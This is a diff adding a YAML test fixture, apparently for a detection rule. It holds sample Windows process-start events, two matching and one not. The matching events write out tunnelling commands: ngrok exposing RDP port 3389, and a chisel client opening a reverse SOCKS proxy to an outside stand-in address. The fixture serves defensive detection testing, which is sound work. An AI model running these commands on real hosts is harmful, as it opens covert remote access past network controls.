@@ -1,0 +1,28 @@
+docs:
+- id: pos1
+  match: true
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process: {name: ngrok.exe, executable: 'C:\Windows\System32\ngrok.exe', command_line: ngrok tcp 3389}
+- id: pos2
+  match: true
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process: {name: chisel.exe, executable: 'C:\Windows\System32\chisel.exe', command_line: 'chisel client 203.0.113.9:8080
+        R:socks'}
+- id: neg1
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process: {name: notepad.exe, executable: 'C:\Windows\System32\notepad.exe', command_line: notepad.exe}
